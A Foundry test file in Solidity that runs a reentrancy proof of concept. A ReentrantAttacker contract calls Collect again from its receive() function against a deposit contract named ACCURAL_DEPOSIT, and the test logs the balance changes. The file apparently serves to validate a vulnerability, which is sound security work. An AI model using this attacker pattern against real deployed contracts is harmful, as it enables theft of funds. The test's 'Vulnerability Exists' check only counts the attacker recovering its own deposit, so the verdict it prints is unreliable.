// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x4320e6f8c05b27ab4707cd1f6d5ce6f3e4b3a5a1.sol";

contract ReentrancyTest is Test {
    ACCURAL_DEPOSIT public accrualDeposit;
    LogFile public logFile;
    ReentrantAttacker public attacker;

    function setUp() public {
        logFile = new LogFile();
        accrualDeposit = new ACCURAL_DEPOSIT();
        accrualDeposit.SetLogFile(address(logFile));
        accrualDeposit.SetMinSum(0.5 ether);

        attacker = new ReentrantAttacker(payable(address(accrualDeposit)), 2);
        vm.deal(address(attacker), 1 ether);
    }

    function testReentrancyAttack() public {
        // Attacker deposits its 1 ETH balance into contract
        attacker.deposit();

        // Check initial conditions
        assertEq(address(accrualDeposit).balance, 1 ether, "Initial deposit failed");

        // BEGIN: Differential Validation 
        console.log("--- BEFORE-Trigger ---");
        uint256 contractBalanceBefore = address(accrualDeposit).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        console.log("ACCURAL_DEPOSIT balance:", contractBalanceBefore);
        console.log("Attacker balance:", attackerBalanceBefore);

        console.log("--- Trigger: Reentrancy Attack ---");
        attacker.attack();

        console.log("--- AFTER-Trigger ---");
        uint256 contractBalanceAfter = address(accrualDeposit).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        console.log("ACCURAL_DEPOSIT balance:", contractBalanceAfter);
        console.log("Attacker balance:", attackerBalanceAfter);

        uint256 contractDiff = contractBalanceBefore - contractBalanceAfter;
        uint256 attackerDiff = attackerBalanceAfter - attackerBalanceBefore;
        console.log("Contract Diff (ETH):", contractDiff / 1 ether);
        console.log("Attacker Diff (ETH):", attackerDiff / 1 ether);

        if (contractDiff == 1 ether && attackerDiff == 1 ether) {
            console.log("Vulnerability Exists: Reentrancy attack drained 1 ETH from contract");
        } else {
            console.log("Vulnerability not Exist: Contract drained %d ETH, Attacker gained %d ETH", 
                contractDiff / 1 ether, attackerDiff / 1 ether);
        }
        // END: Differential Validation
    }
}

contract ReentrantAttacker {
    ACCURAL_DEPOSIT public target;
    uint256 public count;
    uint256 public maxReentrancy;

    constructor(address payable _target, uint256 _maxReentrancy) {
        target = ACCURAL_DEPOSIT(_target);
        maxReentrancy = _maxReentrancy;
    }

    function deposit() public {
        // Deposit the contract's current balance
        target.Deposit{value: address(this).balance}();
    }

    function attack() public {
        count = 0;
        target.Collect(0.5 ether);
    }

    receive() external payable {
        count++;
        if (count < maxReentrancy) {
            target.Collect(0.5 ether);
        }
    }
}